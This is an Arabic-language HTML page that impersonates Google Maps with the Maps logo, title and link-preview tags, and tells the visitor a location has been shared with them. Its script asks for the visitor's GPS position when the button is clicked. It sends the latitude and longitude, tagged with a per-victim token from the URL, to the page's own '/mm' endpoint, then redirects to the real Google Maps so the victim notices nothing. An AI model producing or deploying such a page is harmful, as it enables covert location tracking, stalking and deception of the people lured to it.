<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for Preview -->
    <meta property="og:title" content="Google Maps - الموقع المشترك">
    <meta property="og:description" content="تمت مشاركة موقع جغرافي معك. انقر لعرض الموقع على الخريطة والحصول على الاتجاهات.">
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
    <meta property="og:type" content="website">

    <title>Google Maps</title>
    <style>
        body { font-family: Roboto, Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .map-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); text-align: center; width: 320px; }
        .btn { display: inline-block; padding: 10px 24px; background-color: #1a73e8; color: white; border-radius: 4px; text-decoration: none; font-weight: 500; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="map-card">
        <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" width="64" alt="Maps">
        <h3>تمت مشاركة موقع معك</h3>
        <p>انقر على الزر أدناه لعرض الموقع الحالي.</p>
        <div class="btn" id="locBtn">عرض الموقع</div>
    </div>

    <script>
        const token = window.location.pathname.split('/').pop();

        document.getElementById('locBtn').onclick = function() {
            this.innerText = "جاري تحديد الموقع...";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    fetch('/mm', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            token: token,
                            deviceInfo: {
                                ip: "Location Data",
                                lat: lat,
                                lon: lon,
                                googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
                            }
                        })
                    });
                    setTimeout(() => window.location.href = `https://www.google.com/maps?q=${lat},${lon}`, 1000);
                }, err => {
                    window.location.href = "https://www.google.com/maps";
                });
            } else {
                window.location.href = "https://www.google.com/maps";
            }
        };
    </script>
</body>
</html>
